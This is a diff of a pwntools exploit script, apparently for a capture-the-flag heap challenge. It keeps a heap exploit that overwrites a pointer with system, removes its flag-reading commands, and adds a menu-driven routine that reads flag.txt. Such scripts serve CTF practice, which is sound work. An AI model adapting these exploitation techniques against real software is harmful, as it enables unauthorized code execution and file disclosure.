@@ -10,7 +10,7 @@ from pwn import *
 
 pie  = 1
 arch = 64
-bps  = []
+bps  = [0x0000000000001FD4, 0x0000000000001F9D]
 
 
 def init():
@@ -32,7 +32,7 @@ def init():
     sla("shell(0)<", "SPAWN")
     ru(" Enter process name")
     sla("shell(0)<", "storage")
-    sla("shell(0)<", "EXIT")
+    sla("shell(0)<", "SLEEP")
 
 def add(idx, size):
     sla(")< ", "1")
@@ -52,7 +52,7 @@ def edit(idx, data):
     sla(")< ", str(idx))
     sla(")< ", data)
 
-def exp():
+def exp1():
     init()
     add(0, 0x500)
     add(1, 0x20)
@@ -81,12 +81,63 @@ def exp():
     edit(2, flat(system))
 
     dele(3)
-    sl("cat flag.txt")
-    sl("cat bTAkUG9eCMgCbGMQbx8a")
 
+def shell(con=''):
+    sla("shell(0)< ", con)
+
+def storage(con=''):
+    sla("storage(1)< ", con)
+
+def cat(con=''):
+    sla("cat(2)< ", con)
+
+def send(con):
+    sla("<", con)
+
+def exp():
+    shell("SPAWN")
+    ru("shell(0)> Enter process name:")
+    shell("storage")
+    shell()
+    shell()
+    shell()
+    shell()
+    shell()
+    shell()
+
+    storage('1')
+    shell()
+    shell()
+    storage('0')
+    shell()
+    shell()
+    storage(str(0x100))
+    shell()
+    shell()
+
+    storage('2')
+    shell()
+    shell()
+    storage('0')
+    shell()
+    shell()
+    storage()
+
+    shell("SPAWN")
+    storage()
+    storage('3')
+    shell("cat")
+    storage('0')
+    shell()
+    shell()
+    shell()
+    cat('arst')
+    shell()
+    storage('flag.txt')
 
 
 context.os='linux'
+
 
 context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
@@ -139,6 +190,7 @@ if libc2714:
     psystem = 0x04f550
 
 
+elf = ELF('./bin')
 
 def gdba():
     if local == 0:
